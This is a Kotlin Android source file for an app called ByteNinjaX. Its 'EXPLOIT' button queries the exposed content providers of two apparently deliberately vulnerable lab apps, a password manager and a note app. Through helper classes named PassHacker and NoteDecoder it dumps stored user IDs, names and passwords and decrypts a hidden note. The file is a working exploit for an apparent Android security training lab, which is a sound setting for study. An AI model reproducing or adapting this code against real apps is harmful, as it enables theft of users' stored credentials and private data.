package com.ruhlanusubov.byteninjax

import android.app.Activity
import android.content.Context
import android.net.Uri
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Button
import androidx.compose.material3.Divider
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.MutableState
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.saveable.rememberSaveable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import androidx.compose.ui.zIndex
import com.ruhlanusubov.byteninjax.extension.NoteDecoder
import com.ruhlanusubov.byteninjax.extension.PassHacker
import com.ruhlanusubov.byteninjax.model.UserDTO
import com.ruhlanusubov.byteninjax.ui.theme.ByteNinjaXTheme

class HomeActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            ByteNinjaXTheme {
                Exploit(activity = this)
            }
        }
    }
}


@Composable
fun Exploit(activity: ComponentActivity){

    val userList = remember { mutableStateOf(listOf<UserDTO>()) }
    val hiddenMessage = remember { mutableStateOf("") }
    val displayUser = rememberSaveable { mutableStateOf(false) }
    val showAlertDialog = rememberSaveable { mutableStateOf(false) }
    val showFileErrorMessage = rememberSaveable { mutableStateOf(false) }
    val showDbErrorMessage = rememberSaveable { mutableStateOf(false) }
    val showAlert = rememberSaveable { mutableStateOf(false) }

    val context= LocalContext.current

    ///

    Box(
        modifier = Modifier
            .fillMaxSize()
            .padding(3.dp)
    ){
        Button(
            onClick = {
                startExploit(context, activity, userList, displayUser, hiddenMessage, showFileErrorMessage, showDbErrorMessage, showAlert)
            },
            modifier = Modifier
                .align(Alignment.BottomCenter)
                .zIndex(1f)
        ) {
            Text("EXPLOIT")
        }

        ExploitResultDisplay(userList, hiddenMessage, displayUser, showAlertDialog, showFileErrorMessage, showDbErrorMessage)
    }
}
@Composable
fun ExploitResultDisplay(users: MutableState<List<UserDTO>>,
                         secretText: MutableState<String>,
                         displayUsers: MutableState<Boolean>,
                         showAlert: MutableState<Boolean>,
                         showFileErrorDialog: MutableState<Boolean>,
                         showDbErrorDialog: MutableState<Boolean>) {
    if (displayUsers.value) {
        User(users.value, secretText.value)
    }


    AlertDialogDisplay(showAlert, showFileErrorDialog, showDbErrorDialog)
}

@Composable
fun User(users:List<UserDTO>,hiddenText:String){

    Column(
        modifier = Modifier
            .verticalScroll(rememberScrollState())
            .fillMaxSize()
            .padding(20.dp)
    ) {
        Text("Credentials of PwdManager", modifier = Modifier.padding(bottom = 20.dp), style =MaterialTheme.typography.displayMedium)

        users.map {
            Text(text ="ID: ${it.id}, NAME: ${it.name} ,PASSWORD: ${it.password}", modifier = Modifier.padding(20.dp))
        }

        Divider(
            color= Color.DarkGray,
            thickness = 0.8.dp
        )
        Text(text = "Note from SafeNote", modifier = Modifier.padding(bottom = 20.dp), style = MaterialTheme.typography.displayMedium)
        Text(text = hiddenText, style = MaterialTheme.typography.bodyMedium, modifier = Modifier
            .padding(bottom = 16.dp)
            .fillMaxWidth())
    }

}
fun startExploit(context: Context, activity: ComponentActivity, userList: MutableState<List<UserDTO>>,
                 displayUserList: MutableState<Boolean>, hiddenMessage: MutableState<String>, showFileErrorAlert: MutableState<Boolean>, showDbErrorAlert: MutableState<Boolean>, showAlert: MutableState<Boolean>
){
    if (android.os.Build.VERSION.SDK_INT==29){
        if (fileExists(context, "content://com.els.safenote/Congratulations.txt") &&
            dbExists(context, "content://com.els.pwdmanager.contentprovider/pwds")) {
            val passHacker = PassHacker()
            displayUserList.value = true

            userList.value = passHacker.queryPasswords(activity)
            val noteHacker = passHacker.getAppPassword(activity, "SafeNote")
                ?.let { NoteDecoder(it) }
            if (noteHacker != null) {
                hiddenMessage.value = noteHacker.getFile(activity).toString()
            }
        } else {
            if (!fileExists(context, "content://com.els.safenote/Congratulations.txt")) {
                showFileErrorAlert.value = true
            }
            if (!dbExists(context, "content://com.els.pwdmanager.contentprovider/pwds")) {
                showDbErrorAlert.value = true
            }
        }
    }else{
        showAlert.value=true
    }
}

@Composable
fun AlertDialogDisplay(showAlert: MutableState<Boolean>, showFileErrorDialog: MutableState<Boolean>, showDbErrorDialog: MutableState<Boolean>) {
    if (showAlert.value) {
        AlertDialog(
            onDismissRequest = { showAlert.value = false },
            title = { Text("SDK Version Check") },
            text = { Text("Supported SDK version 29.") },
            confirmButton = {
                TextButton(onClick = { showAlert.value = false }) {
                    Text("OK")
                }
            }
        )
    }

    if (showFileErrorDialog.value) {
        AlertDialog(
            onDismissRequest = { showFileErrorDialog.value = false },
            title = { Text("File Not Found") },
            text = { Text("Are you sure you run vulnerable apps first?") },
            confirmButton = {
                TextButton(onClick = { showFileErrorDialog.value = false }) {
                    Text("OK")
                }
            }
        )
    }

    if (showDbErrorDialog.value) {
        AlertDialog(
            onDismissRequest = { showDbErrorDialog.value = false },
            title = { Text("Database Not Found") },
            text = { Text("The database not found. Please run vulnerable apps first") },
            confirmButton = {
                TextButton(onClick = { showDbErrorDialog.value = false }) {
                    Text("OK")
                }
            }
        )
    }
}
fun fileExists(context: Context, uriString: String): Boolean {
    return try {
        context.contentResolver.openInputStream(Uri.parse(uriString)).use {
            it != null
        }
    } catch (e: Exception) {
        false
    }
}

fun dbExists(context: Context, uriString: String): Boolean {
    return try {
        val cursor = context.contentResolver.query(Uri.parse(uriString), null, null, null, null)
        cursor != null && cursor.moveToFirst().also { cursor.close() }
    } catch (e: Exception) {
        false
    }
}

